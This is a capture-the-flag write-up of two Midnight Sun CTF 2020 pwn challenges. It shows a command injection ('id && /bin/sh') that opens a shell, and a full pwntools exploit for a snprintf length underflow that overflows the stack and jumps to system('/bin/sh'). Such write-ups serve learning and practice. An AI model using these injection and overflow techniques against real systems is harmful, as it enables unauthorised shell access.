# MidnightsunCTF2020
url: [https://ctf.midnightsunctf.se/](https://ctf.midnightsunctf.se/)
country: Sweden
team: TaQini@Nepnep 

## Admpanel

input `id && /bin/sh` to getshell

``` shell
$ nc admpanel-01.play.midnightsunctf.se 31337
---=-=-=-=-=-=-=-=-=---
-      Admin panel    -
-
- [0] - Help
- [1] - Authenticate
- [2] - Execute command
- [3] - Exit
---=-=-=-=-=-=-=-=-=---
 > 1
  Input username: admin
  Input password: password
 > 2
  Command to execute: id && /bin/sh
uid=999(ctf) gid=999(ctf) groups=999(ctf)
ls -al
total 32
drwxr-xr-x 1 root ctf   4096 Apr  3 05:41 .
drwxr-xr-x 1 root root  4096 Apr  3 05:41 ..
-rwxr-x--- 1 root ctf  14408 Apr  3 13:09 chall
-r--r----- 1 root ctf     41 Apr  2 21:20 flag
-rwxr-x--- 1 root ctf     71 Apr  2 21:20 redir.sh
cat flag
midnight{n3v3r_4sk_b0bb_to_d0_S0m3TH4Ng}
```


## Admpanel2

In func `sub_40121A`, `maxlen` is an unsigned integer, if the return value of `snprintf` is nearly `0x100`, after 3 times `maxlen -= n` executed , maxlen will be a great integer. Buffer overflow will happen after input a long string.

```c
  maxlen = 0x100LL;
  n = snprintf(&buf, 0x100uLL, "LOG: [OPERATION: %s] ", a1, a2);
  if ( n < 0 )
    exit(1);
  ptr += n;
  maxlen -= n;         // first 
  if ( authed )        // authed=1 after [1]auth 
  {
    n = snprintf(ptr, maxlen, "[USERNAME: %s] ", var_138);
    if ( n < 0 )
      exit(1);
    ptr += n;
    maxlen -= n;      // second 
  }
  if ( *var_rsp )
  {
    n = snprintf(ptr, maxlen, "%s", var_rsp);
    if ( n < 0 )
      exit(1);
    ptr += n;
    maxlen -= n;      // thrid, bof here
  }
  fprintf(stderr, "%s\n", &buf);
```

> bof is enable while `authed=1` 

This elf64 program use format string `%s` to print our input string to `ptr`(in stack) , so only one gadget can be used beacuse bad code `\x00` in address of gadget will terminal our input. 

>  ROP is not a good idea.

But ret2text is still available, only one gadget is enough: 

```nasm
.text:0000000000401598  mov     rdi, rax        ; command
.text:000000000040159B  call    _system
```

Before ret2text ,we should set `rax` point to `"/bin/sh"`. This work can be done by selected [1]auth one more time and set the begining of username to `"/bin/sh;"`.

Exp:

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './admpanel2'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
system = 0x000000000401598 

# elf, libc
satck = 0x4040E0+0x100
# rop1
offset = 282
payload = ''
payload += 'A'*offset
payload += p64(system)
payload = payload.ljust(1000,'\0')

# auth flag = 1
sla(' > ','1')
sla('  Input username: ','admin'+'a'*1000)
sla('  Input password: ','password233')

# rax <- /bin/sh;
sla(' > ','1')
sla('  Input username: ','/bin/sh;'+'b'*1000)

sla(' > ','2')
# debug('b *0x4015A1\nb *0x040121A')
sla('  Command to execute: ',payload)

p.interactive()
```

> focus on the layout of regs is helpful while pwnning ---

